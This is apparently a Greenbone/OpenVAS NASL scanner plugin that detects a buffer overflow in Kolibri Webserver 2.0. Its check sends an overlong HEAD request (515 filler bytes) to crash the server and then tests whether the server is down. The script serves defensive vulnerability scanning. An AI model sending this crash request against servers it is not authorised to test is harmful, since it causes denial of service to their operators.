if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901171" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-12-31 07:04:16 +0100 (Fri, 31 Dec 2010)" );
	script_bugtraq_id( 45579 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Kolibri Webserver 'HEAD' Request Processing Buffer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "kolibri/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to crash the
  server process, resulting in a denial-of-service condition." );
	script_tag( name: "affected", value: "Kolibri Webserver version 2.0" );
	script_tag( name: "insight", value: "This flaw is caused by a buffer overflow error when handling
  overly long 'HEAD' requests, which could allow remote unauthenticated attackers
  to compromise a vulnerable web server via a specially crafted request." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Kolibri Webserver and is prone to buffer
  overflow vulnerability." );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15834/" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2010/3332" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(ContainsString( banner, "erver: kolibri" )){
	host = http_host_name( port: port );
	crash = "HEAD /" + crap( 515 ) + " HTTP/1.1\\r\\n" + "Host: " + host + "\\r\\n\\r\\n";
	http_send_recv( port: port, data: crash );
	if(http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

